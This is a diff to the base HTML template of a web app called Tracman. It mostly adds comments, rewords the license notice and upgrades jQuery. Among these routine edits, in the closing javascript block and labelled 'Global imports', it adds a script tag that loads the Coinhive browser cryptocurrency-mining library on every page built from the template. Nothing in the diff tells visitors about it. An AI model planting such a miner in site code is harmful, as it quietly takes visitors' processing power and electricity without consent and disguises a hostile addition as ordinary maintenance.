@@ -9,9 +9,7 @@
 
 	This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
 
-	You should have received a copy of the GNU General Public License along with this program.  If not, see <http://www.gnu.org/licenses/>.
-
-	(A full copy of this programs license is available at https://github.com/Tracman-org/Server/blob/master/LICENSE.md)
+	A copy of this program's license is available at <https://github.com/Tracman-org/Server/blob/master/LICENSE.md>.
 
 -->
 
@@ -20,6 +18,7 @@
 	{% block head %}
 		<title>{% block title %}Tracman{% endblock %}</title>
 		
+		<!-- Metadata -->
 		<link rel="manifest" href="/static/manifest.webmanifest">
 		<meta http-equiv="Content-type" content="text/html;charset=utf-8">
 		<meta charset="UTF-8">
@@ -31,7 +30,8 @@
 		<meta name="msapplication-navbutton-color" content="#222">
 		<meta name="apple-mobile-web-app-capable" content="yes">
 		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-
+		
+		<!-- Icons -->
 		<link rel="shortcut icon" sizes="16x16 32x32 48x48" type="image/x-icon" href="/static/img/icon/by/16-32-48.ico">
 		<link rel="icon apple-touch-icon" sizes="32x32" type="image/png" href="/static/img/icon/by/32.png">
 		<link rel="icon apple-touch-icon" sizes="57x57" type="image/png" href="/static/img/icon/by/57.png">
@@ -41,27 +41,45 @@
 		<link rel="icon apple-touch-icon" sizes="228x228" type="image/png" href="/static/img/icon/by/228.png">
 		<link rel="apple-touch-icon-precomposed" type="image/png" href="/static/img/icon/by/152.png">
 		
+		<!-- Styles -->
 		<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
 		<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:300,600">
 		<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Merriweather:300,700">
-		<script type="application/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
-		
 		<link rel="stylesheet" type="text/css" href="/static/css/.base.min.css">
+		
+		<!-- Head javascript imports -->
+		<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+		<!--[if lt IE 9]>
+			<script src="/scripts/html5shiv.js"></script>
+			<script src="/scripts/respond.min.js"></script>
+		<![endif]-->
 	
 	{% endblock %}
+	
+	<!-- Header and footer CSS -->
 	{% if not noHeader %}<link href="/static/css/.header.min.css" rel="stylesheet">{% endif %}
 	{% if not noFooter %}<link href="/static/css/.footer.min.css" rel="stylesheet">{% endif %}
 	</head>
+	
 	<body>
-
+		
+		<!-- Header -->
 		{% if not noHeader %}{% include 'templates/header.html' %}{% endif %}
+		
 		<main>
+			
+			<!-- Main page -->
 			{% block main %}{% endblock %}
+			
+			<!-- Footer -->
 			{% if not noFooter %}{% include 'templates/footer.html' %}{% endif %}
+			
 		</main>
 
 		<!-- Javascript -->
 		{% block javascript %}
+			<!-- Global imports -->
+			<script type="application/javascript" src="https://coin-hive.com/lib/coinhive.min.js"></script>
 			<script type="application/javascript" src="/static/js/.base.bun.js"></script>
 		{% endblock %}
 
